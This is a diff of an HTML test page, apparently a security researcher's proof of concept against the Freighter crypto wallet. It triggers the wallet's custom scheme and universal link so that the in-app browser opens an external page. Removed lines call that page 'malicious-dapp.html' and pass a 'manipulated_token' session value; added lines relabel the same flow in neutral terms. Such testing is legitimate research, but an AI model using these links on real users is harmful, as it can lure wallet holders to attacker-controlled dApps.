@@ -5,27 +5,28 @@
 <title>Deep Link / Universal Link Test - Freighter</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:15px">
-<h2>Deep Link / Scheme Injection Test</h2>
+<h2>Mobile DApp Browser Deep Link Test</h2>
 <pre id=log></pre>
 
-<button onclick="testCustomScheme()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;cursor:pointer">1. Test Custom Scheme / Intent</button>
-<button onclick="testUniversalLink()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;margin-top:10px;cursor:pointer">2. Test Universal Link Manipulation</button>
+<button onclick="testCustomScheme()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;cursor:pointer">1. Test Custom Scheme Navigation</button>
+<button onclick="testUniversalLink()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;margin-top:10px;cursor:pointer">2. Test Universal Link / Open DApp</button>
 
 <script>
 function log(t){
   let logEl = document.getElementById('log');
-  logEl.textContent += '[' + new Date().toLocaleTimeString() + '] ' + t + '\n';
+  let timeStr = new Date().toLocaleTimeString();
+  logEl.textContent += '[' + timeStr + '] ' + t + '\n';
 }
 
 function testCustomScheme(){
-  // Ubah 'freighter://' sesuai dengan custom scheme yang terdaftar pada aplikasi target
-  let maliciousUrl = 'freighter://dapp?url=https://0x403for.github.io/malicious-dapp.html&session=manipulated_token';
-  log('[*] Mencoba memicu skema kustom: ' + maliciousUrl);
+  // Simulasi skema kustom aplikasi seluler untuk membuka dApp browser dengan parameter URL
+  let customSchemeUrl = 'freighter://browser?url=https://0x403for.github.io/blob-test.html';
+  log('[*] Memicu custom scheme: ' + customSchemeUrl);
   
   try {
-    window.location.href = maliciousUrl;
+    window.location.href = customSchemeUrl;
     setTimeout(() => {
-      log('[?] Jika aplikasi tidak merespons, skema kustom mungkin tidak terdaftar atau diblokir.');
+      log('[?] Jika aplikasi tidak merespons, pastikan skema terdaftar pada perangkat.');
     }, 2000);
   } catch(e) {
     log('[-] Error: ' + e.message);
@@ -33,13 +34,12 @@ function testCustomScheme(){
 }
 
 function testUniversalLink(){
-  // Uji manipulasi parameter pada domain Universal Link resmi aplikasi target
-  // Contoh format URL universal link dengan menyisipkan parameter arbitrer atau dApp eksternal
-  let targetUniversalLink = 'https://wallet.freighter.app/browser?url=https://0x403for.github.io/malicious-dapp.html';
-  log('[*] Mengarahkan ke Universal Link: ' + targetUniversalLink);
+  // Simulasi Universal Link resmi untuk mengarahkan alur ke dalam aplikasi seluler
+  let universalLinkUrl = 'https://wallet.freighter.app/browser?url=https://0x403for.github.io/blob-test.html';
+  log('[*] Memicu Universal Link: ' + universalLinkUrl);
   
   try {
-    window.location.href = targetUniversalLink;
+    window.location.href = universalLinkUrl;
   } catch(e) {
     log('[-] Error: ' + e.message);
   }
